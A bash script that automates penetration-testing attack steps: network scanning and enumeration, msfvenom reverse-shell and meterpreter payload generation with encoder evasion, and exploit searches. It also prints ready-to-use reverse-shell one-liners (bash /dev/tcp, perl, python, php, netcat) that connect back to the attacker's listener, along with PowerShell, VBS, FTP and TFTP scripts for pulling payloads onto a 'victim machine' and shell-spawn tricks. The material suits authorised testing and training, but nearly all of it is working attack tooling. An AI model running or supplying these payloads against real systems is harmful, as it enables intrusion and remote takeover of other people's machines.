#!/bin/bash
# Written by: m0tda



#################
## Help Module ##
#################
function example(){
	echo ""
	echo "========="
	echo " Example "
	echo "========="
	echo " General usage: ${progname} --[module] -[submodule]"
	echo " Information for module: ${progname} --[module] "
	echo " Help page for the program: ${progname} --help"
	echo ""
	echo " This script contain multiple module and submodule use --help for detailed informations"
	echo ""
}
function nethelp(){
	echo ""
	echo "========="
	echo " Network "
	echo "========="
	echo " This module is used for all networking purpose, ping-sweep, tcp-scan etc..."
	echo " address can be given as the following 192.168.0.1 or 192.168.0.1-255 for range."
	echo ""
	echo " [Module] "
	echo " --network ............Perform networking task."
	echo ""
	echo " {Submodule} "
	echo " -ping ................Ping the given address."
	echo " -top20 ...............Scan target top 10 tcp ports."
	echo " -tcp .................Scan target all the tcp ports."
	echo " -udp .................Scan target for open udp ports."
	echo " -enum4 ...............Scan target using enum4linux."
	echo " -all .................Scan target for all service."
	echo " -nikto ...............Scan target webservice."
	echo " -dirb ................Enumerate directory on target webserver."
	echo ""
}
function payhelp(){
	echo ""
	echo "========="
	echo " Payload "
	echo "========="
	echo " This module is used to generate multiples payload using msfvenom and veil-evasion."
	echo ""
	echo " [Module] "
	echo " --payload ............Generate a specific payload."
	echo ""
	echo " {Submodule} "
	echo " -linux_ns86 ...............Generate a linux reverse-shell binary."
	echo " -linux_s86 ................Generate a linux staged reverse-shell binary."
	echo " -linux_ns64 ...............Generate a linux staged reverse-shell binary."
	echo " -linux_s64 ................Generate a linux staged reverse-shell binary."
	echo " -windows_ns86 .............Generate a windows reverse-shell binary."
	echo " -windows_s86 ..............Generate a windows reverse-shell binary."
	echo " -windows_ns64 .............Generate a windows reverse-shell binary."
	echo " -windows_s64 ..............Generate a windows reverse-shell binary."
	echo " -linux_shellcode_ns86 .....Generate a linux reverse-shell shellcode."
	echo " -linux_shellcode_ns64 .....Generate a linux reverse-shell shellcode."
	echo " -windows_shellcode_ns86 ...Generate a windows reverse-shell shellcode."
	echo " -windows_shellcode_ns64 ...Generate a windows reverse-shell shellcode."
	echo " -reverse_shell ............Print quick reverse-shell."
	echo ""
}
function srchhelp(){
	echo ""
	echo "========"
	echo " Search "
	echo "========"
	echo " This module is used to automatically search for possible exploits."
	echo ""
	echo " [Module] "
	echo " --search .............Search in the database for possible exploits."
	echo ""
	echo " {Submodule} "
	echo " -exploitdb ...........Search for exploit in exploitdb."
	echo " -linux_suggester .....Search for linux exploits."
	echo " -windows_suggester ...Search for windows exploits, for more info see link below."
	echo "  https://github.com/GDSSecurity/Windows-Exploit-Suggester"
	echo ""
}
function mischelp(){
	echo ""
	echo "======"
	echo " Misc "
	echo "======"
	echo " This module contained multiple usefull stuff such as command to spawn tty "
	echo " transfer script etc... see below for more info."
	echo ""
	echo " [Module] "
	echo " --misc ...............Perform misc tasks."
	echo ""
	echo " {Submodule} "
	echo " -tty .................Print possible tty spawn."
	echo " -local_script ...............Print location for usefull scripts in kali."
	echo " -xfer_windows ....Print transfer script for windows."
	echo " -xfer_linux ......Print transfer script for linux."
	echo ""
}
function usage(){
	echo ""
	echo " Usage: ${progname} [Modules] submodule [option1] ... [optionN]"
	echo ""
	echo "========="
	echo " Example "
	echo "========="
	echo " ${progname} --network -ping 192.168.0.1-255"
	echo " ${progname} --help"
	echo ""
	echo "============="
	echo " Description "
	echo "============="
	echo " This shell script is used to automate as much as possible using all shell command."
	echo " All modules and submodules are explained below."
	echo ""
	echo ""
	echo "========="
	echo " Network "
	echo "========="
	echo " This module is used for all networking purpose, ping-sweep, tcp-scan etc..."
	echo " address can be given as the following 192.168.0.1 or 192.168.0.1-255 for range."
	echo ""
	echo " [Module] "
	echo " --network ............Perform networking task."
	echo ""
	echo " {Submodule} "
	echo " -ping ................Ping the given address."
	echo " -top20 ...............Scan target top 10 tcp ports."
	echo " -tcp .................Scan target all the tcp ports."
	echo " -udp .................Scan target for open udp ports."
	echo " -enum4 ...............Scan target using enum4linux."
	echo " -all .................Scan target for all service."
	echo " -nikto ...............Scan target webservice."
	echo " -dirb ................Enumerate directory on target webserver."
	echo ""
	echo ""
	echo "========="
	echo " Payload "
	echo "========="
	echo " This module is used to generate multiples payload using msfvenom and veil-evasion."
	echo ""
	echo " [Module] "
	echo " --payload ............Generate a specific payload."
	echo ""
	echo " {Submodule} "
	echo " -linux_ns86 ...............Generate a linux reverse-shell binary."
	echo " -linux_s86 ................Generate a linux staged reverse-shell binary."
	echo " -linux_ns64 ...............Generate a linux staged reverse-shell binary."
	echo " -linux_s64 ................Generate a linux staged reverse-shell binary."
	echo " -windows_ns86 .............Generate a windows reverse-shell binary."
	echo " -windows_s86 ..............Generate a windows reverse-shell binary."
	echo " -windows_ns64 .............Generate a windows reverse-shell binary."
	echo " -windows_s64 ..............Generate a windows reverse-shell binary."
	echo " -linux_shellcode_ns86 .....Generate a linux reverse-shell shellcode."
	echo " -linux_shellcode_ns64 .....Generate a linux reverse-shell shellcode."
	echo " -windows_shellcode_ns86 ...Generate a windows reverse-shell shellcode."
	echo " -windows_shellcode_ns64 ...Generate a windows reverse-shell shellcode."
	echo " -reverse_shell ............Print quick reverse-shell."
	echo ""
	echo ""
	echo "========"
	echo " Search "
	echo "========"
	echo " This module is used to automatically search for possible exploits."
	echo ""
	echo " [Module] "
	echo " --search .............Search in the database for possible exploits."
	echo ""
	echo " {Submodule} "
	echo " -exploitdb ...........Search for exploit in exploitdb."
	echo " -linux_suggester .....Search for linux exploits."
	echo " -windows_suggester ...Search for windows exploits, for more info see link below."
	echo "  https://github.com/GDSSecurity/Windows-Exploit-Suggester"
	echo ""
	echo ""
	echo "======"
	echo " Misc "
	echo "======"
	echo " This module contained multiple usefull stuff such as command to spawn tty "
	echo " transfer script etc... see below for more info."
	echo ""
	echo " [Module] "
	echo " --misc ...............Perform misc tasks."
	echo ""
	echo " {Submodule} "
	echo " -tty .................Print possible tty spawn."
	echo " -local_script ........Print location for usefull scripts in kali."
	echo " -xfer_windows ........Print transfer script for windows."
	echo " -xfer_linux ..........Print transfer script for linux."
	echo ""
	echo ""
	echo "==========="
	echo " Webserver "
	echo "==========="
	echo " This module is used to automatically start a webserver and print a wget command"
	echo " from the matching interface ex:eth1"
	echo ""
	echo " [Module] "
	echo " --webserver ...........Start a webserver"
	echo ""
}



####################
## Network Module ##
####################
netone(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "======"
	echo " Ping "
	echo "======"
	echo ""
	read -p "[+] Enter the network addresses to scan: " addr
	echo ""
	echo "[+] Scanning network for online devices..."
	sudo nmap -sn -PE $addr -oG ~/Hosts/targets.txt >/dev/null
	cat ~/Hosts/targets.txt |grep 'Up' |cut -d" " -f2 > ~/Hosts/Up.txt
	sleep 1
	clear
	echo "================"
	echo " Online Devices "
	echo "================"
	cat ~/Hosts/Up.txt
	echo ""
	echo "[+] All result are save in ~/Hosts/Up.txt"
	echo ""
}
nettwo(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "=================="
	echo " Top 20 TCP Ports "
	echo "=================="
	echo ""
	read -p "[+] Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "[+] All results are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo nmap -Pn -sS -T4 -f --open --top-ports 20 $addr -oG ~/Hosts/$addr/tcp20.txt
	echo ""
}
nethree(){
	mkdir ~/Hosts
	echo ""
	echo "==============="
	echo " Full TCP Scan "
	echo "==============="
	echo ""
	read -p "[+] Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "[+] Starting full tcp scan please wait..."
	sudo masscan -p1-65535 $addr --banners -sS -Pn -n --randomize-hosts --rate=100000 2>/dev/null > ~/Hosts/$addr/Parsing
	sudo nmap -p`cat ~/Hosts/$addr/Parsing |awk '{print $4}' |cut -d'/' -f1 |sort -n |sed ':a;N;$!ba;s/\n/,/g'` -A -sS -f $addr -o ~/Hosts/$addr/tcp.txt 2>/dev/null
	echo ""
	rm ~/Hosts/$addr/Parsing
	echo "[+] All result are save in ~/Hosts/$addr/ directory."
	echo ""
}
netfour(){
	mkdir ~/Hosts
	echo ""
	echo "==============="
	echo " Full UDP Scan "
	echo "==============="
	echo ""
	read -p "[+] Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "[+] All results are saved in ~/Hosts/$addr/ directory."
	echo ""
	sudo us -H -Iv -mU $addr -p 1-65535 -l ~/Hosts/$addr/udp.txt
	echo ""
}
netfive(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "======="
	echo " Nikto "
	echo "======="
	echo ""
	echo "Example 192.168.0.1:80"
	read -p "[+] Enter network address and port to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "[+] All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo nikto -h http://$addr -output ~/Hosts/$addr/nikto.txt
	echo ""
}
netsix(){	
	mkdir Hosts 2>/dev/null
	echo ""
	echo "======"
	echo " Dirb "
	echo "======"
	echo ""
	echo "Example 192.168.0.1:80"
	read -p "[+] Enter network address to scan: " addr
	mkdir Hosts/$addr 2>/dev/null
	echo ""
	echo "[+] All result are save in ~/Hosts/$addr/ directory."
	echo ""
	sudo dirb http://$addr/ /usr/share/wordlists/dirbuster/directory-list-1.0.txt -o ~/Hosts/$addr/dirb
	echo ""
}
netseven(){
	mkdir ~/Hosts 2>/dev/null
	echo ""
	echo "============"
	echo " Enum4linux "
	echo "============"
	echo ""
	read -p "[+] Enter network address to scan: " addr
	mkdir ~/Hosts/$addr 2>/dev/null
	echo ""
	echo "[+] All result are save in ~/Hosts/$addr/ directory."
	echo ""
	echo "[+] Scanning the given address with enum4linux please-wait."
	sudo enum4linux -a $addr > ~/Hosts/$addr/enum4linux.txt
	echo ""
}
netall(){
	mkdir Hosts 2>/dev/null
	echo ""
	echo "=================="
	echo " Full Enumeration "
	echo "=================="
	echo ""
	echo "[+] Scanning for all tcp,udp and also smtp snmp smb/samba etc... "
	echo "[+] Take note that nikto and dirbuster are not run during this scan."
	echo ""
	read -p "[+] Enter the IP address to enumerate: " addr
	mkdir Hosts/$addr 2>/dev/null
	echo ""
	sudo masscan -p1-65535 $addr --banners -sS -Pn -n --randomize-hosts --rate=100000 2>/dev/null > ~/Hosts/$addr/Parsing
	sudo nmap -p`cat ~/Hosts/$addr/Parsing |awk '{print $4}' |cut -d'/' -f1 |sort -n |sed ':a;N;$!ba;s/\n/,/g'` -A -sS -f $addr -o ~/Hosts/$addr/tcp.txt 2>/dev/null
	sudo us -H -Iv -mU $addr -p1-65535 -l ~/Hosts/$addr/udp.txt 2>/dev/null
	sudo enum4linux -a $addr > ~/Hosts/$addr/enum4linux.txt
	sudo snmp-check $addr > ~/Hosts/$addr/snmp-check.txt
	sudo smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top_shortlist.txt -t $addr > ~/Hosts/$addr/smtp.txt
	rm ~/Hosts/$addr/Parsing
	clear
	echo "[+] All results are saved in ~/Hosts/$addr/ directory."
}



## Network module
if [[ "$@" == "--network" ]]; then
	nethelp
elif [[ "$@" == "--network -ping" ]]; then
	netone
elif [[ "$@" == "--network -top20" ]]; then
	nettwo
elif [[ "$@" == "--network -tcp" ]]; then
	nethree
elif [[ "$@" == "--network -udp" ]]; then
	netfour
elif [[ "$@" == "--network -nikto" ]]; then
	netfive
elif [[ "$@" == "--network -dirb" ]]; then
	netsix
elif [[ "$@" == "--network -enum4" ]]; then
	netseven
elif [[ "$@" == "--network -all" ]]; then
	netall
fi
#*** END OF NETWORK MODULE ***#




########################
#### PAYLOAD MODULE ####
########################
payone(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "==========================================="
	echo " x86 Linux non-staged reverse-shell binary "
	echo "==========================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$addr LPORT=$port -f elf -e x86/shikata_ga_nai -o Payload/linux/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/linux/$name"
	echo ""
}
paytwo(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "======================================="
	echo " x86 Linux staged reverse-shell binary "
	echo "======================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p linux/x86/meterpreter_reverse_https LHOST=$addr LPORT=$port -f elf -e x86/shikata_ga_nai -o Payload/linux/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/linux/$name"
	echo ""
}
paythree(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "==========================================="
	echo " x64 Linux non-staged reverse-shell binary "
	echo "==========================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=$addr LPORT=$port -f elf -e x86/shikata_ga_nai -o Payload/linux/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/linux/$name"
	echo ""
}
payfour(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "==========================================="
	echo " x64 Linux staged reverse-shell binary "
	echo "==========================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p linux/x64/meterpreter_reverse_https LHOST=$addr LPORT=$port -f elf -e x86/shikata_ga_nai -o Payload/linux/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/linux/$name"
	echo ""
}
payfive(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "============================================="
	echo " x86 Windows non-staged reverse-shell binary "
	echo "============================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p windows/shell_reverse_tcp LHOST=$addr LPORT=$port -f exe -e x86/shikata_ga_nai -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/windows/$name"
	echo ""
}
paysix(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "====================================="
	echo " x86 Windows staged reverse-shell binary "
	echo "====================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p windows/meterpreter_reverse_https LHOST=$addr LPORT=$port -f exe -e x86/shikata_ga_nai -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/windows/$name"
	echo ""
}
payseven(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "============================================="
	echo " x64 Windows non-staged reverse-shell binary "
	echo "============================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=$addr LPORT=$port -f exe -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/windows/$name"
	echo ""
}
payeight(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "========================================="
	echo " x64 Windows staged reverse-shell binary "
	echo "========================================="
	echo ""
	read -p "[+] Enter the name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p windows/x64/meterpreter_reverse_https LHOST=$addr LPORT=$port -f exe -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/windows/$name"
	echo ""
}
paynine(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "====================================="
	echo " x86 Linux reverse-shellcode C based "
	echo "====================================="
	echo ""
	read -p "[+] Enter name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	read -p "[+] Enter badcharacters (between quotes \"\"): " badc
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=$addr LPORT=$port -f c -b $badc -o ~/Payload/linux/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/linux/$name"
	echo ""
	cat ~/Payload/linux/$name
	echo ""
}
payten(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/linux/ 2>/dev/null
	echo ""
	echo "====================================="
	echo " x64 Linux reverse-shellcode C based "
	echo "====================================="
	echo ""
	read -p "[+] Enter name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	read -p "[+] Enter badcharacters (between quotes \"\"): " badc
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=$addr LPORT=$port -f c -b $badc -o ~/Payload/linux/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/linux/$name"
	echo ""
	cat ~/Payload/linux/$name
	echo ""
}
payeleven(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "======================================="
	echo " x86 Windows reverse-shellcode C based "
	echo "======================================="
	echo ""
	read -p "[+] Enter name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	read -p "[+] Enter badcharacters (between quotes \"\"): " badc
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p windows/shell_reverse_tcp LHOST=$addr LPORT=$port -f c -b $badc -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/windows/$name"
	echo ""
	cat ~/Payload/windows/$name
	echo""
}
paytwelve(){
	mkdir ~/Payload/ 2>/dev/null
	mkdir ~/Payload/windows/ 2>/dev/null
	echo ""
	echo "======================================="
	echo " x64 Windows reverse-shellcode C based "
	echo "======================================="
	echo ""
	read -p "[+] Enter name of the payload: " name
	read -p "[+] Enter listener address: " addr
	read -p "[+] Enter listener port: " port
	read -p "[+] Enter badcharacters (between quotes \"\"): " badc
	echo ""
	echo "[+] Generating payload..."
	sudo msfvenom -p windows/x64/shell_reverse_tcp LHOST=$addr LPORT=$port -f c -b $badc -o ~/Payload/windows/$name 2>/dev/null
	echo ""
	echo "[+] Payload location: ~/Payload/windows/$name"
	echo ""
	cat ~/Payload/windows/$name
	echo""
}
paythirteen(){
	echo ""
	echo "==============="
	echo " Reverse shell "
	echo "==============="
	echo ""
	read -p "[+] Enter the listener address: " addr
	read -p "[+] Enter the listener port: " port
	echo ""
	echo "[+] Bash:"
	echo "bash -i >& /dev/tcp/$addr/$port 0>&1"
	echo ""
	echo "[+] Perl linux:"
	echo "perl -e 'use Socket;$i=\"$addr\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
	echo ""
	echo "[+] Perl windows:"
	echo "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"$addr:$port\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
	echo ""
	echo "[+] Python:"
	echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$addr\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
	echo ""
	echo "[+] PHP:"
	echo "php -r '$sock=fsockopen(\"$addr\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
	echo ""
	echo "[+] Netcat:"
	echo "nc $addr $port -e /bin/sh"
	echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $addr $port >/tmp/f"
	echo ""
	echo "[+] Alternative to the previous netcat using telnet/netcat:"
	echo "[+] mkfifo /tmp/dummy (On victim machine throught web or remote code)"
	echo "cat /tmp/dummy |nc $addr $port |/bin/sh |nc $addr $port"
	echo "cat /tmp/dummy |telnet $addr $port |/bin/sh |telnet $addr $port"
	echo ""
}

##Payload module
if [[ "$@" == "--payload" ]]; then
	payhelp
elif [[ "$@" == "--payload -linux_ns86" ]]; then
	payone
elif [[ "$@" == "--payload -linux_ns64" ]]; then
	paytwo
elif [[ "$@" == "--payload -linux_s86" ]]; then
	paythree
elif [[ "$@" == "--payload -linux_s64" ]]; then
	payfour
elif [[ "$@" == "--payload -windows_ns86" ]]; then
	payfive
elif [[ "$@" == "--payload -windows_s86" ]]; then
	paysix
elif [[ "$@" == "--payload -windows_ns64" ]]; then
	payseven
elif [[ "$@" == "--payload -windows_s64" ]]; then
	payeight
elif [[ "$@" == "--payload -linux_shellcode_ns86" ]]; then
	paynine
elif [[ "$@" == "--payload -linux_shellcode_ns64" ]]; then
	payten
elif [[ "$@" == "--payload -windows_shellcode_ns86" ]]; then
	payeleven
elif [[ "$@" == "--payload -windows_shellcode_ns64" ]]; then
	paytwelve
elif [[ "$@" == "--payload -reverse_shell" ]]; then
	paythirteen
fi



#######################
#### SEARCH MODULE ####
#######################
srchone(){
	echo ""
	echo "====================="
	echo " Search in exploitdb "
	echo "====================="
	echo ""
	read -p "[+] Enter what you are looking for: " name
	echo ""
	sudo searchsploit $name
}
srchtwo(){
	echo ""
	echo "==================================="
	echo " Search in linux-exploit-suggester "
	echo "==================================="
	echo ""
	read -p "[+] Enter linux kernel-version: " name
	echo ""
	sudo linux-exploit-suggester -k $name
}
srchthree(){
	echo ""
	echo "====================================="
	echo " Search in windows-exploit-suggester "
	echo "====================================="
	echo ""
	sudo windows-exploit-suggester.py --update
	echo ""
	sudo apt-get install python-xlrd 1>/dev/null
	read -p "[+] Enter database name: " db
	read -p "[+] Enter windows systeminfo: " name
	sudo windows-exploit-suggester.py --database $db -o $name
	echo ""
}

## Search Module
if [[ "$@" == "--search" ]]; then
	srchhelp
elif [[ "$@" == "--search -exploitdb" ]]; then
	srchone
elif [[ "$@" == "--search -linux_suggester" ]]; then
	srchtwo
elif [[ "$@" == "--search -windows_suggester" ]]; then
	srchthree
fi
#*** END OF SEARCH MODULE ***#



#####################
#### MISC MODULE ####
#####################
transfer_windows(){
	echo ""
	echo "========================="
	echo " Windows transfer script "
	echo "========================="
	echo ""
	read -p "[+] Enter the address of your listener: " addr
	read -p "[+] Enter the fullname of the payload you whish to transfer: " name
	echo ""
	echo ""
	echo ""
	echo "[+] Powershell transfer script "
	echo ""
	echo "Copy this into the victim machine."
	echo ""
	echo "echo \$storageDir = \$pwd > wget.ps1"
	echo "echo \$webclient = New-Object System.Net.WebClient >>wget.ps1"
	echo "echo \$url = "http://$addr/$name" >>wget.ps1"
	echo "echo \$file = "$name" >>wget.ps1"
	echo "echo \$webclient.DownloadFile(\$url,\$file) >>wget.ps1"
	echo ""
	echo "Call the script using the following command."
	echo "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1"
	echo ""
	echo ""
	echo ""
	echo "[+] VBS transfer script "
	echo ""
	echo "Copy this into the victim machine."
	echo ""
	echo "echo strUrl = WScript.Arguments.Item(0) > wget.vbs"
	echo "echo StrFile = WScript.Arguments.Item(1) >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs"
	echo "echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs"
	echo "echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs"
	echo "echo Err.Clear >> wget.vbs"
	echo "echo Set http = Nothing >> wget.vbs"
	echo "echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs"
	echo "echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs"
	echo "echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs"
	echo "echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs"
	echo "echo http.Open "GET",strURL,False >> wget.vbs"
	echo "echo http.Send >> wget.vbs"
	echo "echo varByteArray = http.ResponseBody >> wget.vbs"
	echo "echo Set http = Nothing >> wget.vbs"
	echo "echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs"
	echo "echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs"
	echo "echo strData = "" >> wget.vbs"
	echo "echo strBuffer = "" >> wget.vbs"
	echo "echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs"
	echo "echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs"
	echo "echo Next >> wget.vbs"
	echo "echo ts.Close >> wget.vbs"
	echo ""
	echo "Call the script using the following command."
	echo "cscript wget.vbs http://$addr/$name $name"
	echo ""
	echo ""
	echo ""
	echo "[+] FTP transfer script "
	echo ""
	echo "Copy this script on the victim machine."
	echo ""
	echo "echo open $addr 21> ftp.txt"
	echo "echo USER asshat>> ftp.txt"
	echo "echo mysecretpassword>> ftp.txt"
	echo "echo bin>> ftp.txt"
	echo "echo GET $name>> ftp.txt"
	echo "echo bye>> ftp.txt"
	echo ""
	echo "Then run this command to connect to the ftp"
	echo "ftp -v -n -s:ftp.txt"
	echo ""
	echo ""
	echo ""
	echo "[+] TFTP transfer script "
	echo ""
	echo "Run the following command on the attacker machine."
	echo ""
	echo "atftpd --daemon --port 69 /tftp"
	echo "/etc/init.d/atftpd restart"
	echo ""
	echo "Run the following command on the victim machine."
	echo "tftp -i $addr GET $name"
	echo ""
	echo "By default the tftp directory is located at /srv/tftp/"
	echo ""
}
transfer_linux(){
	echo ""
	echo "======================="
	echo " Linux transfer script "
	echo "======================="
	echo ""
	read -p "Enter the listener address: " addr
	read -p "Enter the listener port (Needed for netcat): " port
	read -p "Enter the name of the file you whish to transfer: " name
	echo ""
	echo ""
	echo ""
	echo "[+] Netcat "
	echo ""
	echo "On the reveiving end:"
	echo "nc -lvp $port > $name"
	echo ""
	echo "On the sending end:"
	echo "nc -w 3 $addr $port < $name"
	echo ""
	echo ""
	echo ""
	echo "[+] Wget "
	echo ""
	echo "wget $addr/$name"
	echo ""
}
tty(){
	echo ""
	echo "==================="
	echo " TTY spawn command "
	echo "==================="
	echo ""
	echo "[+] Python:"
	echo "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
	echo ""
	echo "[+] Echo:"
	echo "echo os.system('/bin/sh')"
	echo ""
	echo "[+] Perl:"
	echo "perl -e 'exec \"/bin/sh\";"
	echo ""
	echo "[+] Awk:"
	echo "awk 'BEGIN {system(\"/bin/sh\")}'"
	echo ""
	echo "[+] More, Less, and Man Commands:"
	echo "'! /bin/sh'"
	echo "'!/bin/sh'"
	echo "'!bash'"
	echo ""
}
local_script(){
	echo ""
	echo "====================="
	echo " Useful local script "
	echo "====================="
	echo ""
	echo "[+] LinEnum.sh, Linux local enumeration script located there:"
	find / -name LinEnum.sh 2>/dev/null
	echo ""
	echo "[+] linuxprivchecker.py, linux local enumeration for privilege escalation located there: "
	find / -name linuxprivchecker.py 2>/dev/null
	echo ""
	echo "[+] Kali linux webshell"
	ls -R /usr/share/webshells/

}
if [[ "$@" == "--misc" ]]; then
	mischelp
elif [[ "$@" == "--misc -xfer_windows" ]]; then
	transfer_windows
elif [[ "$@" == "--misc -xfer_linux" ]]; then
	transfer_linux
elif [[ "$@" == "--misc -tty" ]]; then
	tty
elif [[ "$@" == "--misc -local_script" ]]; then
	local_script
fi


###############
## Webserver ##
###############
webserver(){
	webserver=`ifconfig eth0 | awk '{print $2}' |grep [0-9] | sed -n 2p`
	if [ "$webserver" ]; then
		echo "Webserver IP: $webserver:80"
	else
		:
	fi
	hostnamed=`hostname 2>/dev/null`
	if [ "$hostnamed" ]; then
		echo "Hostname: $hostnamed"
	else
		:
	fi
	echo "wget $webserver/"
	python -m SimpleHTTPServer 80
}

if [[ "$#" -eq 0 ]]; then
	example
elif [[ "$@" == "--help" ]]; then
	usage |less
elif [[ "$@" == "--webserver" ]]; then
	webserver
fi
